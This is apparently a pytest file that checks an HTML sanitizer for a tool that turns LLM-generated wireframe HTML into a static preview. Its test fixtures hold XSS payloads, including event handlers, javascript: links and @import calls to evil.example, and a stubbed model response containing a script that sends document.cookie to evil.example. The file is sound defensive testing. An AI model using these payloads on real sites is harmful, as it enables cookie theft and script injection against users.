"""Phase 2: the static wireframe preview.

The sanitizer is the security boundary — the model's HTML is untrusted. These
tests prove the injection vectors named in the spec are stripped and that the
structure the developer needs to check survives. The LLM is stubbed.
"""
from __future__ import annotations

import pytest

from keel import engine, llm, mockup
from keel.models import SlotValue

PROV = llm.Provider("groq", "k", "m")

_ADVERSARIAL = """
<html><body onload="steal()">
  <section class="screen"><h3>/book</h3>
    <script>alert('xss')</script>
    <form action="https://evil.example/x" method="post" onsubmit="go()">
      <label>Name <input type="text" placeholder="Jane Doe" onfocus="hack()"></label>
      <label>When <input type="date"></label>
      <button type="submit">Book</button>
    </form>
    <nav><a href="javascript:evil()">home</a> <a href="/rooms">rooms</a></nav>
    <img src="http://tracker.example/p.gif">
    <iframe src="https://evil.example"></iframe>
    <object data="x.swf"></object>
    <style>@import url('http://evil.example/x.css'); body{background:#eee}</style>
    <div style="color:#333;background:url(http://evil.example/bg)">grey box</div>
    <div style="color:#444">clean box</div>
    <marquee>legacy tag</marquee>
  </section>
</body></html>
"""


def test_sanitizer_strips_every_injection_vector():
    out = mockup.sanitize_html(_ADVERSARIAL)
    for bad in ("<script", "alert(", "onload=", "onfocus=", "onsubmit=",
                "javascript:", "evil.example", "<iframe", "<object", "<img",
                "@import", "url(", "action=", "method="):
        assert bad not in out, f"sanitizer leaked {bad!r}\n{out}"


def test_sanitizer_keeps_the_structure_the_developer_checks():
    out = mockup.sanitize_html(_ADVERSARIAL)
    assert "/book" in out and "<h3>" in out
    assert "<form>" in out and 'placeholder="Jane Doe"' in out
    assert '<input type="text"' in out and 'type="date"' in out
    assert 'href="#"' in out and out.count('href="#"') == 2   # both links neutralised
    assert "legacy tag" in out                                # unknown tag unwrapped, text kept
    assert 'style="color:#444"' in out                        # benign inline style kept
    assert "background:url" not in out                         # style with url() dropped whole


def test_sanitizer_never_raises_on_garbage():
    for junk in ("", "<<<>>>", "<div><span>", "<a href=", "\x00<script", "not html at all"):
        assert isinstance(mockup.sanitize_html(junk), str)


# --------------------------------------------------------------------------- #
def _finished(idea="a booking website for a small hotel", template="web-app"):
    s = engine.start_session(idea, template, created_date="2026-09-01", depth="thorough")
    s.slots["interfaces"] = SlotValue(
        value="GET / (home), GET /rooms (availability), POST /book (create booking), "
              "GET /booking/<id> (confirmation)", source="asked")
    s.slots["data_model"] = SlotValue(
        value="Room(id, number); Booking(id, room_id, guest_name, check_in, check_out)",
        source="asked")
    s.finished = True
    return s


def test_build_mockup_strips_an_injected_script_from_a_stubbed_response(monkeypatch):
    poisoned = ('<section class="screen"><h3>/book</h3>'
                '<script>fetch("//evil.example/"+document.cookie)</script>'
                '<form><input placeholder="name"></form></section>')
    monkeypatch.setattr("keel.llm.complete_json",
                        lambda *a, **k: ({"html": poisoned}, None))
    html_doc, err = mockup.build_mockup(_finished(), provider=PROV)
    assert err is None
    assert "<script" not in html_doc and "evil.example" not in html_doc
    assert "document.cookie" not in html_doc
    assert html_doc.startswith("<!DOCTYPE html>")
    assert "Wireframe preview" in html_doc          # the fixed shell banner
    assert "/book" in html_doc                      # the real structure survived


def test_build_mockup_reflects_the_interface_routes(monkeypatch):
    def fake(system, user, **kw):
        assert "POST /book" in user and "Room(id" in user   # given the right slots
        return {"html": "<section class='screen'><h3>POST /book</h3>"
                        "<section class='screen'><h3>GET /rooms</h3></section></section>"}, None
    monkeypatch.setattr("keel.llm.complete_json", fake)
    html_doc, err = mockup.build_mockup(_finished(), provider=PROV)
    assert err is None and "POST /book" in html_doc and "GET /rooms" in html_doc


def test_build_mockup_surfaces_an_llm_failure_and_counts_the_call(monkeypatch):
    monkeypatch.setattr("keel.llm.complete_json", lambda *a, **k: (None, "RateLimitError"))
    s = _finished()
    html_doc, err = mockup.build_mockup(s, provider=PROV)
    assert html_doc is None and err == "RateLimitError"
    assert s.call_count == 1                        # the attempt is charged against the cap


def test_build_mockup_empty_html_is_an_error(monkeypatch):
    monkeypatch.setattr("keel.llm.complete_json", lambda *a, **k: ({"html": "   "}, None))
    html_doc, err = mockup.build_mockup(_finished(), provider=PROV)
    assert html_doc is None and "no wireframe HTML" in err


def test_mockup_module_has_no_streamlit_or_filesystem_dependency():
    import inspect
    src = inspect.getsource(mockup)
    assert "streamlit" not in src
    assert "open(" not in src and "Path(" not in src   # never touches the host fs
